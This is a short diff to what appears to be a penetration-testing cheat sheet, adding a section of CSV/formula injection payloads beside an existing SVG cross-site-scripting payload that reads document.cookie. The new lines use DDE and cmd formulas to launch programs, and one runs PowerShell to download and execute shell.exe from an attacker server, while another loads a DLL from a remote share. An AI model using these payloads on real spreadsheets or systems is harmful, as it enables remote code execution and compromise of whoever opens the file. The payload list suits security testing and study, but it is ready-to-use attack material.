@@ -102,6 +102,15 @@ https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-uploa
 		  alert(document.cookie);
 	   </script>
 	</svg>
+	
+# CSV Injection Payload
+
+	DDE ("cmd";"/C calc";"!A0")A0
+	@SUM(1+9)*cmd|' /C calc'!A0
+	=10+20+cmd|' /C calc'!A0
+	=cmd|' /C notepad'!'A1'
+	=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
+	=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
 
 # Android Apk VAPT
 ## Insecure-data-storage
